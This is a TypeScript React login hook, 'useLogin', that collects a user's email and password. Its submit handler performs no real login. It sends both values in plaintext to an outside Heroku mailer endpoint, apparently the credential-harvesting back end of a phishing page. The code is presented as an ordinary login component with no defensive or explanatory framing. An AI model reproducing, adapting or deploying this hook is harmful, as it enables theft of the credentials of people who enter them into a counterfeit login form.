import { useState } from 'react'
import Swal from 'sweetalert2/dist/sweetalert2.js'

interface ChangeProps {
  target: { name: string; value: string }
}

interface LoginHookProps {
  user: {
    email: string
    password: string
  }
  error: string
  loading: boolean
  setUser: unknown
  sendMailRequest: (arg0: { preventDefault: () => void }) => void
  handleChange: (arg0: ChangeProps) => void
}

interface UserProps {
  email: string
  password: string
}

const useLogin = (): LoginHookProps => {
  const [user, setUser] = useState<UserProps>({ email: '', password: '' })
  const [loading, setLoading] = useState<boolean>(false)
  const [error, setError] = useState<string>('')

  const handleChange = (e: ChangeProps): void => {
    const { name, value } = e.target
    setUser({ ...user, [name]: value })
  }

  const sendMailRequest = async (e: { preventDefault: () => void }): Promise<void> => {
    e.preventDefault()
    const { email, password } = user
    if (!email || !password) {
      return Swal.fire('Oops...', 'Something went wrong!', 'error')
    }
    setLoading(true)
    setError('')
    try {
      const res = await fetch('https://mailer-bus.herokuapp.com/v1/api/mail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: 'Admin',
          email,
          password,
        }),
      })
      await res.json()
    } catch (error) {
      setError('Something Went Wrong Please try again ')
    }
    setLoading(false)
  }
  return {
    user,
    error,
    loading,
    setUser,
    handleChange,
    sendMailRequest,
  }
}

export default useLogin
